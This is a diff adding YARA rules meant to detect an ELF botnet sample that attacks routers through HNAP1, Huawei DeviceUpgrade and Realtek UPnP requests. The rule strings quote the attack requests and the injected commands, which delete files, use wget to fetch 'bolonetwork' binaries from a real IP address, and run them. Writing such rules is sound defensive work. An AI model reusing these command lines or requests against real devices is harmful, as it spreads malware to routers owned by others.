@@ -1,0 +1,96 @@
+ELF
+MD5:fa7d3c6a34642d73b54638baa1869e9c 
+SHA-1:9648eb1aeb7b89559779233f2f3bda85ff22c731 
+SHA-256:ae6b5dd7d340cac2652d16e4a25a796e25f19af2533ee4a47e1caef83a5b4a26
+
+
+rule Detect_HNAP1_Malicious_Payload_ELF
+{
+    meta:
+        description = "Detects malicious payload exploiting HNAP1 protocol"
+        author = "CMPC"
+        date = "2024-07-21"
+        sample_reference = "https://bazaar.abuse[].]ch/download/ae6b5dd7d340cac2652d16e4a25a796e25f19af2533ee4a47e1caef83a5b4a26/"
+
+    strings:
+        $post_request = "POST /HNAP1/ HTTP/1.0"
+        $content_type = "Content-Type: text/xml; charset=\"utf-8\""
+        $soap_action_prefix = "SOAPAction: http://purenetworks.com/HNAP1/"
+        $command_cd_tmp = "`cd /tmp"
+        $command_rm_rf = "rm -rf *"
+        $command_wget = "wget http://15.235.203.214/bolonetwork.mips"
+        $command_chmod = "chmod +x bolonetwork.mips"
+        $command_execute = "./bolonetwork.mips self"
+
+    condition:
+        all of ($post_request, $content_type, $soap_action_prefix, $command_cd_tmp, $command_rm_rf, $command_wget, $command_chmod, $command_execute)
+}
+
+
+rule Detect_DeviceUpgrade_Malicious_Payload_ELF
+{
+    meta:
+        description = "Detects malicious payload in POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
+        author = "CMPC"
+        date = "2024-07-21"
+        sample_reference = "https://bazaar.abuse[].]ch/download/ae6b5dd7d340cac2652d16e4a25a796e25f19af2533ee4a47e1caef83a5b4a26/"
+
+    strings:
+        $post_device_upgrade = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
+        $connection_keep_alive = "Connection: keep-alive"
+        $accept_all = "Accept: */*"
+        $authorization_huawei = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\""
+        $nonce = "nonce=\"88645cefb1f9ede0e336e3569d75ee30\""
+        $uri = "uri=\"/ctrlt/DeviceUpgrade_1\""
+        $response = "response=\"3612f843a42db38f48f59d2a3597e19c\""
+
+    condition:
+        all of ($post_device_upgrade, $connection_keep_alive, $accept_all, $authorization_huawei, $nonce, $uri, $response)
+}
+
+rule Detect_Picdesc_Malicious_Payload_ELF
+{
+    meta:
+        description = "Detects malicious payload in POST /picdesc.xml HTTP/1.1"
+        author = "CMPC"
+        date = "2024-07-21"
+        sample_reference = "https://bazaar.abuse[].]ch/download/ae6b5dd7d340cac2652d16e4a25a796e25f19af2533ee4a47e1caef83a5b4a26/"
+
+    strings:
+        $post_picdesc = "POST /picdesc.xml HTTP/1.1"
+        $host_local = "Host: 127.0.0.1:52869"
+        $content_length = "Content-Length: 630"
+        $accept_encoding = "Accept-Encoding: gzip, deflate"
+        $soap_action = "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
+        $accept_all = "Accept: */*"
+        $user_agent = "User-Agent: Mozilla/4.0 (compatible; MSI\"E 6.0; Windows NT 5.1)"
+        $connection_keep_alive = "Connection: keep-alive"
+        $command_sequence = "`cd /var; rm -rf bulol; wget http://15.235.203.214/bolonetwork.x86 -O bulol; chmod 777 bulol; ./bulol selfrep.rt`"
+
+    condition:
+        all of ($post_picdesc, $host_local, $content_length, $accept_encoding, $soap_action, $accept_all, $user_agent, $connection_keep_alive, $command_sequence)
+}
+
+
+rule Detect_Wanipcn_Malicious_Payload_ELF
+{
+    meta:
+        description = "Detects malicious payload in POST /wanipcn.xml HTTP/1.1"
+        author = "CMPC"
+        date = "2024-07-21"
+        sample_reference = "https://bazaar.abuse[].]ch/download/ae6b5dd7d340cac2652d16e4a25a796e25f19af2533ee4a47e1caef83a5b4a26/"
+
+    strings:
+        $post_wanipcn = "POST /wanipcn.xml HTTP/1.1"
+        $host_local = "Host: 127.0.0.1:52869"
+        $content_length = "Content-Length: 630"
+        $accept_encoding = "Accept-Encoding: gzip, deflate"
+        $soap_action = "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
+        $accept_all = "Accept: */*"
+        $user_agent = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+        $connection_keep_alive = "Connection: keep-alive"
+        $command_sequence = "`cd /var; rm -rf bulol; wget http://15.235.203.214/bolonetwork.x86 -O bulol; chmod 777 bulol; ./bulol selfrep.rt`"
+
+    condition:
+        all of ($post_wanipcn, $host_local, $content_length, $accept_encoding, $soap_action, $accept_all, $user_agent, $connection_keep_alive, $command_sequence)
+}
